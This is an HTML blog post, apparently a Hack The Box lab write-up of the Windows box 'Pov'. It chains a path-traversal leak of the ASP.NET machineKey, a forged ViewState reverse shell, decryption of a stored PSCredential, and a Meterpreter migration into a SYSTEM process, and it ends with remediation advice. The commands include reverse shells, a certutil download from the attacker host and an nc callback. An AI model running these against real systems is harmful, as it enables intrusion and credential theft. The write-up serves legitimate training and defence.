@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+  <title>┌──(1kb2㉿onekbtwo)-[~/blog/pov]</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="alternate" type="application/rss+xml" title="1kb2" href="../feed.xml">
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="../favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../apple-touch-icon.png">
+  <meta name="theme-color" content="#000000">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="HTB CPTS Track: Pov (medium)">
+  <meta property="og:description" content="Black-box Windows box: an LFI in a dev vhost leaks the ASP.NET machineKey, a forged __VIEWSTATE gives RCE as sfitz, a saved PSCredential in connection.xml unlocks alaading, and SeDebugPrivilege is abused to migrate into a SYSTEM process for root.">
+  <meta property="og:url" content="https://1kb2.xyz/blog/pov.html">
+  <meta property="og:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HTB CPTS Track: Pov (medium)">
+  <meta name="twitter:description" content="Black-box Windows box: an LFI in a dev vhost leaks the ASP.NET machineKey, a forged __VIEWSTATE gives RCE as sfitz, a saved PSCredential in connection.xml unlocks alaading, and SeDebugPrivilege is abused to migrate into a SYSTEM process for root.">
+  <meta name="twitter:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <script>document.documentElement.className = "js";</script>
+  <script src="../js/graf.js" defer></script>
+  <script src="../js/post.js" defer></script>
+</head>
+<body data-graf="perch">
+  <nav class="nav">
+    <a href="../index.html">home</a>
+    <a href="../timeline.html">timeline</a>
+    <a href="../blog/index.html">blog</a>
+    <a href="../feed.xml">rss</a>
+  </nav>
+
+  <main class="markdown-body">
+    <h1>HTB CPTS Track: Pov (medium)</h1>
+    <p class="post-meta">2026-10-12 &middot; <a class="post-cat" href="index.html#cat-htb-cpts-track-writeups">HTB &quot;CPTS Track&quot; writeups</a></p>
+    <p class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a><a class="tag" href="tag/web.html" data-tag="web">#web</a><a class="tag" href="tag/lfi.html" data-tag="lfi">#lfi</a><a class="tag" href="tag/viewstate-deserialization.html" data-tag="viewstate-deserialization">#viewstate-deserialization</a><a class="tag" href="tag/runas.html" data-tag="runas">#runas</a><a class="tag" href="tag/sedebugprivilege.html" data-tag="sedebugprivilege">#sedebugprivilege</a><a class="tag" href="tag/windows-privilege-escalation.html" data-tag="windows-privilege-escalation">#windows-privilege-escalation</a></p>
+    <p class="post-abstract">Black-box Windows box: an LFI in a dev vhost leaks the ASP.NET machineKey, a forged __VIEWSTATE gives RCE as sfitz, a saved PSCredential in connection.xml unlocks alaading, and SeDebugPrivilege is abused to migrate into a SYSTEM process for root.</p>
+    <details class="toc-box" open>
+      <summary>contents</summary>
+<div class="toc">
+<ul>
+<li><a href="#enumeration">Enumeration</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#fuzzing">Fuzzing</a></li>
+</ul>
+</li>
+<li><a href="#initial-foothold-lfi-to-viewstate-rce">Initial Foothold: LFI to ViewState RCE</a></li>
+<li><a href="#user-connectionxml-to-alaading">User: connection.xml to alaading</a></li>
+<li><a href="#root-sedebugprivilege-the-long-way">Root: SeDebugPrivilege, the Long Way</a><ul>
+<li><a href="#everything-that-didnt-work">Everything that didn't work</a></li>
+<li><a href="#what-actually-worked">What actually worked</a></li>
+</ul>
+</li>
+<li><a href="#remediation">Remediation</a></li>
+</ul>
+</div>
+    </details>
+<p><img alt="" src="../images/Pov1.png" /></p>
+<p>Pov is a medium Windows box built around one classic ASP.NET chain: leak the <code>machineKey</code>, forge a <code>__VIEWSTATE</code>, get RCE. The foothold is clean and the user step is a gift, but the privilege escalation is where I spent most of my time. I had <code>SeDebugPrivilege</code> the whole way and still fought it for an evening, so this writeup keeps all of that in, the manual token tools that didn't work, the one that finally did, and me being upfront that I never fully pinned down why.</p>
+<ol>
+<li>An <strong>LFI</strong> in the <code>dev</code> vhost's CV download reads <code>web.config</code> and leaks the ASP.NET <strong><code>machineKey</code></strong>.</li>
+<li>With the key, forge a signed <strong><code>__VIEWSTATE</code></strong> (ysoserial.net) for RCE as <strong><code>pov\sfitz</code></strong>.</li>
+<li>A saved <strong><code>PSCredential</code></strong> in <code>connection.xml</code> decrypts to <strong><code>alaading</code></strong>'s password, then RunasCs for user.</li>
+<li><code>alaading</code> holds <strong><code>SeDebugPrivilege</code></strong>, abuse it to inject into a SYSTEM process for root.</li>
+</ol>
+<blockquote>
+<p>No creds to start, black-box from the Nmap scan.</p>
+</blockquote>
+<hr />
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="link to this section">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="link to this section">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.82.126<span class="w"> </span>-T5
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+|_http-title: pov.htb
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div>
+
+<p>One port: IIS on 80, titled <code>pov.htb</code>. With a single port and a vhost-style title, I skipped straight to fuzzing after adding <code>pov.htb</code> to <code>/etc/hosts</code>.</p>
+<h3 id="fuzzing">Fuzzing<a class="headerlink" href="#fuzzing" title="link to this section">&para;</a></h3>
+<p>Directory fuzzing only turned up the usual static folders (<code>img</code>, <code>css</code>, <code>js</code>), nothing useful. So I pivoted to vhost fuzzing, which is where the box opens up:</p>
+<div class="codehilite"><pre><span></span><code>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ<span class="w"> </span>-u<span class="w"> </span>http://pov.htb/<span class="w"> </span>-H<span class="w"> </span><span class="s1">'Host: FUZZ.pov.htb'</span><span class="w"> </span>-fs<span class="w"> </span><span class="m">12330</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 4228ms]
+</code></pre></div>
+
+<p>Add <code>dev.pov.htb</code> to <code>/etc/hosts</code>.</p>
+<hr />
+<h2 id="initial-foothold-lfi-to-viewstate-rce">Initial Foothold: LFI to ViewState RCE<a class="headerlink" href="#initial-foothold-lfi-to-viewstate-rce" title="link to this section">&para;</a></h2>
+<p><code>dev.pov.htb</code> is a portfolio site for "Stephen Fitz" with two places that take input: a contact form (a dead end) and a <strong>Download CV</strong> button on <code>/portfolio</code>.</p>
+<p><img alt="" src="../images/Pov2.png" /></p>
+<p><img alt="" src="../images/Pov3.png" /></p>
+<p>The download is driven by a <code>file</code> parameter, which is the kind of thing worth testing for traversal. On an ASP.NET WebForms app the file I most want is <strong><code>web.config</code></strong>, because that's where the <code>machineKey</code> lives, and the <code>machineKey</code> is what signs <code>__VIEWSTATE</code>. A <code>....//</code> traversal in the <code>file</code> parameter slips past the filter and reads it:</p>
+<p><img alt="" src="../images/Pov4.png" /></p>
+<div class="codehilite"><pre><span></span><code>POST /portfolio/default.aspx ... &amp;file=....//web.config
+
+&lt;machineKey decryption="AES"
+  decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
+  validation="SHA1"
+  validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" /&gt;
+</code></pre></div>
+
+<p>And from the request itself, <code>__VIEWSTATEGENERATOR=8E0F0FA3</code>.</p>
+<blockquote>
+<p><strong>Why this works:</strong> ASP.NET WebForms round-trips page state in a <code>__VIEWSTATE</code> blob that the server deserializes on every postback. To stop tampering, that blob is signed (and optionally encrypted) with the <code>machineKey</code>. If you <em>have</em> the <code>machineKey</code>, you can build your own serialized.NET gadget, sign it so it passes validation, and the server will happily deserialize it, which is remote code execution. Leaking <code>web.config</code> via the LFI hands over exactly that key, so the LFI and the ViewState bug chain into one.</p>
+</blockquote>
+<p>Following the <a href="https://hacktricks.wiki/en/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret.html">HackTricks ViewState guide</a>, I generate a signed payload with the leaked key, the <code>WindowsIdentity</code> gadget, the <code>/portfolio</code> path, and a base64 PowerShell reverse shell to <code>10.10.14.137:6767</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">.\</span><span class="n">ysoserial</span><span class="p">.</span><span class="n">exe</span> <span class="n">-p</span> <span class="n">ViewState</span> <span class="n">-g</span> <span class="n">WindowsIdentity</span> <span class="p">-</span><span class="n">-decryptionalg</span><span class="p">=</span><span class="s2">"AES"</span> <span class="p">-</span><span class="n">-decryptionkey</span><span class="p">=</span><span class="s2">"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"</span> <span class="p">-</span><span class="n">-validationalg</span><span class="p">=</span><span class="s2">"SHA1"</span> <span class="p">-</span><span class="n">-validationkey</span><span class="p">=</span><span class="s2">"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"</span> <span class="p">-</span><span class="n">-path</span><span class="p">=</span><span class="s2">"/portfolio"</span> <span class="n">-c</span> <span class="s2">"powershell -e JABjAGwAaQBlAG4AdAAg...(base64 reverse shell, trimmed)"</span> <span class="n">k</span><span class="k">%</span><span class="n">2FMKZYh4kbB4DU7Tg2tPprVXRG1lXWJIy4YyV4DwvZ1CAIwyHQZ7Vlszu2KIK</span><span class="k">%</span><span class="n">2FH3fFTJbZMdhGk8gmEYMI2Gokjy</span><span class="k">%</span><span class="n">2FbTCm3tLKlYDuj0AiIDz5QMUhf2AAYIDCC0dBGdK6ytq9Q</span><span class="k">%</span><span class="n">3D</span><span class="k">%</span><span class="n">3D</span>
+</code></pre></div>
+
+<p>ysoserial.net is a.NET binary and Wine wasn't cooperating for me, so I ran it on a throwaway Windows VM (hence the <code>.\ysoserial.exe</code>). That trailing blob (<code>k%2FMKZYh4...q9Q%3D%3D</code>) is the page's <code>__EVENTVALIDATION</code>.</p>
+<p>ysoserial hands back the forged <code>__VIEWSTATE</code> (<code>E08R07gh4QR7AXpkN%2Bt675...</code>, trimmed). Drop it into the <code>__VIEWSTATE</code> field of the <code>/portfolio</code> postback (alongside <code>__VIEWSTATEGENERATOR=8E0F0FA3</code> and the current <code>__EVENTVALIDATION</code>), send it, and catch the shell as <strong><code>pov\sfitz</code></strong>:</p>
+<p><img alt="" src="../images/Pov5.png" /></p>
+<div class="codehilite"><pre><span></span><code>$ nc -lvnp 6767
+Connection received on 10.129.82.126 49671
+PS C:\windows\system32\inetsrv&gt; whoami
+pov\sfitz
+</code></pre></div>
+
+<hr />
+<h2 id="user-connectionxml-to-alaading">User: connection.xml to alaading<a class="headerlink" href="#user-connectionxml-to-alaading" title="link to this section">&para;</a></h2>
+<p>Poking around the home directory, there's a stored credential in Documents:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">connection</span><span class="p">.</span><span class="n">xml</span>
+<span class="p">&lt;</span><span class="n">Objs</span> <span class="n">Version</span><span class="p">=</span><span class="s2">"1.1.0.1"</span> <span class="n">xmlns</span><span class="p">=</span><span class="s2">"http://schemas.microsoft.com/powershell/2004/04"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="n">Obj</span> <span class="n">RefId</span><span class="p">=</span><span class="s2">"0"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="n">TN</span> <span class="n">RefId</span><span class="p">=</span><span class="s2">"0"</span><span class="p">&gt;&lt;</span><span class="n">T</span><span class="p">&gt;</span><span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">&lt;/</span><span class="n">T</span><span class="p">&gt;</span> <span class="p">...&lt;/</span><span class="n">TN</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="n">Props</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="n">S</span> <span class="n">N</span><span class="p">=</span><span class="s2">"UserName"</span><span class="p">&gt;</span><span class="n">alaading</span><span class="p">&lt;/</span><span class="n">S</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="n">SS</span> <span class="n">N</span><span class="p">=</span><span class="s2">"Password"</span><span class="p">&gt;</span><span class="n">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb5434</span><span class="p">...(</span><span class="n">DPAPI</span> <span class="n">blob</span><span class="p">,</span> <span class="n">trimmed</span><span class="p">)&lt;/</span><span class="n">SS</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="n">Props</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="n">Obj</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="n">Objs</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>It's a serialized <code>PSCredential</code>, so PowerShell decrypts it for me:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Import-Clixml</span> <span class="n">-Path</span> <span class="s2">"connection.xml"</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="nv">$cred</span><span class="p">.</span><span class="n">GetNetworkCredential</span><span class="p">().</span><span class="n">Password</span>
+<span class="n">f8gQ8fynP44ek1m3</span>
+</code></pre></div>
+
+<blockquote>
+<p><strong>Why this works:</strong> <code>Export-Clixml</code> stores a <code>PSCredential</code> with the password encrypted via <strong>DPAPI under the user who saved it</strong>. Any process running as that same user can <code>Import-Clixml</code> and have Windows transparently decrypt it, no master password, no cracking. Because the file sits in <code>sfitz</code>'s profile and I'm running as <code>sfitz</code>, the decryption just happens. This is why a <code>.xml</code> credential file on a box you already have a foothold on is almost always a free credential.</p>
+</blockquote>
+<p>New creds: <strong><code>alaading / f8gQ8fynP44ek1m3</code></strong>. Pull <code>RunasCs</code> over and use them to spawn a shell as <code>alaading</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">&gt;</span> <span class="n">certutil</span><span class="p">.</span><span class="n">exe</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">137</span><span class="p">:</span><span class="n">80</span><span class="p">/</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">\</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span>
+<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span> <span class="n">alaading</span> <span class="n">f8gQ8fynP44ek1m3</span> <span class="n">powershell</span> <span class="n">-r</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">137</span><span class="p">:</span><span class="n">6768</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PS C:\Users\alaading\Desktop&gt; type user.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>user.txt captured.</strong></p>
+<hr />
+<h2 id="root-sedebugprivilege-the-long-way">Root: SeDebugPrivilege, the Long Way<a class="headerlink" href="#root-sedebugprivilege-the-long-way" title="link to this section">&para;</a></h2>
+<p>winPEAS found nothing exciting, but <code>whoami /priv</code> had the one line that matters:</p>
+<div class="codehilite"><pre><span></span><code>Privilege Name                Description                    State
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Enabled
+</code></pre></div>
+
+<blockquote>
+<p><strong>Why <code>SeDebugPrivilege</code> is game over:</strong> it lets a process open a handle to <em>any</em> process on the host, including ones owned by SYSTEM. With that handle you can inject code into a SYSTEM process or duplicate its token, so on paper the account is already SYSTEM. You just have to actually land the injection, and that's where I lost an evening.</p>
+</blockquote>
+<h3 id="everything-that-didnt-work">Everything that didn't work<a class="headerlink" href="#everything-that-didnt-work" title="link to this section">&para;</a></h3>
+<p>I went down every manual token route before the one that worked. The short version of what <em>failed</em>:</p>
+<ul>
+<li><strong><code>SeDebugPrivesc.exe</code></strong> (spawn a child under a target SYSTEM process's token by parent-PID spoofing). Staged msfvenom payloads connected then died to Defender, a mono-compiled C# shell ran fine as <code>alaading</code> but never called back as SYSTEM, and the core SYSTEM processes, <code>lsass</code> (644), <code>services</code> (624), <code>wininit</code> (508), just threw <code>Error 5</code>???  (access denied), which I never got to the bottom of.</li>
+<li><strong><code>psgetsys.ps1</code></strong> (<code>ImpersonateFromParentPid</code>). After sorting out the right call (this fork is a function, not a <code>[MyProcess]</code> class), every child came back identically:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>ImpersonateFromParentPid -ppid 560 -command "c:\windows\system32\cmd.exe" -cmdargs "/c c:\users\alaading\nc64.exe 10.10.14.137 9001 -e powershell"
+[+] Got Handle for ppid: 560
+[+] Updated proc attribute list
+[+] Starting c:\windows\system32\cmd.exe ... True - pid: 1592 - Last error: 122
+</code></pre></div>
+
+<p><code>True</code>, a PID, then nothing, the child was gone with no callback. A file-write proof (<code>whoami &gt; who.txt</code> through the same mechanism) never created the file, so the child wasn't really executing at all.</p>
+<p><strong>I'll be straight: I never worked out why any of it failed. So I stopped fighting the token tools and just got myself a better shell.</strong></p>
+<h3 id="what-actually-worked">What actually worked<a class="headerlink" href="#what-actually-worked" title="link to this section">&para;</a></h3>
+<p>I reached for the tool that does the injection itself, <strong>Meterpreter</strong>. Build an x64 payload, run it as <code>alaading</code>, catch the session, and migrate into a SYSTEM process:</p>
+<div class="codehilite"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.137<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">6969</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>2kb1.exe
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>[*] Meterpreter session 1 opened (10.10.14.137:6969 -&gt; 10.129.230.183:49677)
+
+(Meterpreter 1)(C:\Users\alaading) &gt; migrate 560
+[*] Migrating from 4640 to 560...
+[*] Migration completed successfully.
+(Meterpreter 1)(C:\Windows\system32) &gt; shell
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre></div>
+
+<blockquote>
+<p><strong>Why <code>migrate</code> worked when the manual tools didn't:</strong> <code>migrate</code> injects its DLL straight into the target process using <code>SeDebugPrivilege</code>, with no child process to spawn. My guess, it just isn't as fragile as the shell I had before.</p>
+</blockquote>
+<p>From there, the flag:</p>
+<div class="codehilite"><pre><span></span><code>C:\Users\Administrator\Desktop&gt;type root.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>root.txt captured. Box owned.</strong></p>
+<hr />
+<h2 id="remediation">Remediation<a class="headerlink" href="#remediation" title="link to this section">&para;</a></h2>
+<ul>
+<li><strong>Fix the LFI.</strong> The CV download has a path-traversal in its <code>file</code> parameter; canonicalise and whitelist the path. Leaking <code>web.config</code> is what starts the whole chain.</li>
+<li><strong>Rotate and protect the <code>machineKey</code>.</strong> Once the key is out, every signed <code>__VIEWSTATE</code> is forgeable. Don't serve <code>web.config</code>, and set <code>machineKey</code> from a protected source, not inline.</li>
+<li><strong>Don't leave recoverable credentials on disk.</strong> <code>connection.xml</code> is a DPAPI-sealed <code>PSCredential</code>, but it's trivially decryptable by anyone running as that user. Remove it, or use a real secret store.</li>
+<li><strong>Strip <code>SeDebugPrivilege</code> from service accounts.</strong> It is equivalent to SYSTEM on the host. The <code>alaading</code> account has no business holding it.</li>
+</ul>
+<hr />
+<p>References:</p>
+<ul>
+<li><a href="https://hacktricks.wiki/en/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret.html">HackTricks, Exploiting __VIEWSTATE knowing the MachineKey</a></li>
+<li><a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a></li>
+<li><a href="https://github.com/antonioCoco/RunasCs">RunasCs</a></li>
+<li><a href="https://github.com/decoder-it/psgetsys">psgetsys.ps1 (decoder-it)</a></li>
+</ul>
+  </main>
+  <nav class="related" aria-label="Related posts">
+    <h2 class="related-h">related</h2>
+    <ul class="posts">
+      <li class="post"><a class="post-title" href="media.html">HTB CPTS Track: Media (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/web.html" data-tag="web">#web</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a><a class="tag" href="tag/windows-privilege-escalation.html" data-tag="windows-privilege-escalation">#windows-privilege-escalation</a></span></li>
+      <li class="post"><a class="post-title" href="trick.html">HTB CPTS Track: Trick (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/lfi.html" data-tag="lfi">#lfi</a><a class="tag" href="tag/web.html" data-tag="web">#web</a></span></li>
+      <li class="post"><a class="post-title" href="tombwatcher.html">HTB CPTS Track: TombWatcher (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+      <li class="post"><a class="post-title" href="jeeves.html">HTB CPTS Track: Jeeves (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+      <li class="post"><a class="post-title" href="fluffy.html">HTB CPTS Track: Fluffy (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+    </ul>
+  </nav>
+
+  <footer class="footer">
+    <a href="../index.html">back to top</a>
+  </footer>
+</body>
+</html>
